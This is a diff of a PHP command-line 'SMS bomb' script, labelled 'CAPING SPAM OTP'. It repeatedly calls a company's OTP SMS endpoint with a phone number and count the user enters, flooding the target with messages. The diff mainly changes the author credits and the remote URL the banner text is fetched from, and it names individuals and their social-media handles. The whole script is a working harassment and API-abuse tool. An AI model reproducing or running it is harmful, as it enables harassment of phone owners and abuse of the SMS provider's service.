@@ -1,7 +1,7 @@
 <?php
-/// fb.com/miles ///
+/// fb.com/alfianokt104 ///
 /// Please don't recode my script ///
-$pesan = file_get_contents('https://raw.githubusercontent.com/glfi/ministry/main/pemula');
+$pesan = file_get_contents('http://aos-file.000webhostapp.com/caping-spam/notes.txt');
 function bom($hp){
 $data = array("mobile" => $hp); $data_string = json_encode($data);
 $ch = curl_init('https://ai.caping.co.id/v2/sms/send');
@@ -15,11 +15,11 @@ echo $result;
 echo "\n";
 }
 system('clear');
-echo "Creator\t\t:\miles\nFacebook\t:\tfb.com/miles\nTelegram\t:\tt.me/miles\n\n";
-echo "<[ miles ]>\n";
+echo "Creator\t\t:\tAlfian Oktafireza\nFacebook\t:\tfb.com/alfianokt104\nTelegram\t:\tt.me/alfian_oktafireza\n\n";
+echo "<[ CAPING SPAM OTP ]>\n";
 echo "____________________\n\n";
 echo "Pesan : $pesan \n\n";
-echo "Nomer dimulai dari +62..\nMasukkan Nomer\t: ";
+echo "Nomer dimulai dari 62..\nMasukkan Nomer\t: ";
 $no = trim(fgets(STDIN));
 echo "Jumlah  Bom\t: ";
 $jumlah = trim(fgets(STDIN));
